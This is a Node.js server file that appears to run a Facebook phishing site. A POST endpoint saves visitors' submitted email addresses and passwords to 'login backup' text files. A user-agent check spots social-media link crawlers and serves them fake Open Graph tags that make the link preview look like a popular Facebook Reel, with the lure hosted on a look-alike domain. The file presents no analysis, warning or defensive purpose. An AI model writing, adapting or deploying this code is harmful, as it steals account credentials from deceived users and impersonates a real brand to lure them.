import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

const PORT = process.env.PORT || 5173;
const BASE_DIR = process.cwd();
const DIST_DIR = path.join(BASE_DIR, 'dist');
const SAVED_DIR = path.join(BASE_DIR, 'saved');
const isProduction = process.env.NODE_ENV === 'production' || fs.existsSync(DIST_DIR);

// Ensure the saved directory exists
if (!fs.existsSync(SAVED_DIR)) {
  fs.mkdirSync(SAVED_DIR, { recursive: true });
}

// Serve static files
const server = http.createServer((req, res) => {
  console.log(`[API] ${req.method} ${req.url}`);

  // Handle the save backup API
  if (req.method === 'POST' && req.url === '/api/save-backup') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `facebook_mobile_login_backup_${timestamp}.txt`;
        const filePath = path.join(SAVED_DIR, fileName);

        const fileContent = [
          `Facebook Mobile Login Backup`,
          `Timestamp: ${data.timestamp}`,
          `Email: ${data.email || '(empty)'}`,
          `Password: ${data.password || '(empty)'}`,
          `Post URL: ${data.postUrl || '(empty)'}`,
          `Post Caption: ${data.postCaption || '(empty)'}`,
          `Post Source: ${data.postSource || '(empty)'}`,
        ].join('\r\n');

        fs.writeFileSync(filePath, fileContent, 'utf-8');

        console.log(`Backup saved: ${fileName}`);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, file: fileName }));
      } catch (err) {
        console.error('Failed to save backup:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Failed to save backup' }));
      }
    });

    return;
  }

  // Serve static files
  if (isProduction) {
    const cleanUrl = req.url.split('?')[0];

    // If request comes from a social media crawler/bot (WhatsApp, Facebook, Messenger, Telegram, Twitter, etc.)
    const userAgent = req.headers['user-agent'] || '';
    const isCrawler = /bot|crawl|spider|facebookexternalhit|facebot|whatsapp|telegram|twitterbot|discordbot|slackbot|linkedinbot|skypeuripreview|applebot/i.test(userAgent);

    if (isCrawler && (cleanUrl === '/' || !path.extname(cleanUrl))) {
      const crawlerHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>511K views • 5K likes | Reel by Semsem Photograph</title>
  <meta name="description" content="511K views • 5K likes | Reel by Semsem Photograph" />
  <meta property="og:site_name" content="Facebook" />
  <meta property="og:type" content="video.other" />
  <meta property="og:url" content="https://facebook-eg.up.railway.app/" />
  <meta property="og:title" content="511K views • 5K likes | Reel by Semsem Photograph" />
  <meta property="og:description" content="511K views • 5K likes | Reel by Semsem Photograph" />
  <meta property="og:image" content="https://facebook-eg.up.railway.app/download.jpg" />
  <meta property="og:image:secure_url" content="https://facebook-eg.up.railway.app/download.jpg" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:width" content="575" />
  <meta property="og:image:height" content="1024" />
  <meta property="og:image:alt" content="Reel by Semsem Photograph" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:site" content="@facebook" />
  <meta name="twitter:title" content="511K views • 5K likes | Reel by Semsem Photograph" />
  <meta name="twitter:description" content="511K views • 5K likes | Reel by Semsem Photograph" />
  <meta name="twitter:image" content="https://facebook-eg.up.railway.app/download.jpg" />
  <link rel="image_src" href="https://facebook-eg.up.railway.app/download.jpg" />
  <link rel="icon" type="image/jpeg" href="https://facebook-eg.up.railway.app/download.jpg" />
</head>
<body>
</body>
</html>`;
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(crawlerHtml);
      return;
    }

    let filePath = path.join(DIST_DIR, cleanUrl === '/' ? 'index.html' : cleanUrl);

    fs.readFile(filePath, (err, content) => {
      if (err) {
        // Fallback for download.jpg if directly in public/
        if (cleanUrl === '/download.jpg') {
          const publicImg = path.join(BASE_DIR, 'public', 'download.jpg');
          if (fs.existsSync(publicImg)) {
            res.writeHead(200, { 'Content-Type': 'image/jpeg' });
            return fs.createReadStream(publicImg).pipe(res);
          }
        }

        // SPA fallback to index.html
        if (!path.extname(cleanUrl)) {
          const indexPath = path.join(DIST_DIR, 'index.html');
          if (fs.existsSync(indexPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            return fs.createReadStream(indexPath).pipe(res);
          }
        }

        res.writeHead(404);
        res.end('Not found');
        return;
      }

      const ext = path.extname(filePath);
      const mimeTypes = {
        '.html': 'text/html; charset=utf-8',
        '.js': 'text/javascript',
        '.css': 'text/css',
        '.json': 'application/json',
        '.png': 'image/png',
        '.jpg': 'image/jpeg',
        '.jpeg': 'image/jpeg',
        '.svg': 'image/svg+xml',
        '.ico': 'image/x-icon',
        '.webp': 'image/webp',
        '.woff': 'font/woff',
        '.woff2': 'font/woff2',
        '.ttf': 'font/ttf'
      };

      res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' });
      res.end(content);
    });
    return;
  }
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Backups saved to: ${SAVED_DIR}`);
  console.log(`Serving from: ${DIST_DIR}`);
});

server.on('error', (err) => {
  console.error('Server error:', err.message);
  console.error(err.stack);
  process.exit(1);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message);
  console.error(err.stack);
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  process.exit(1);
});
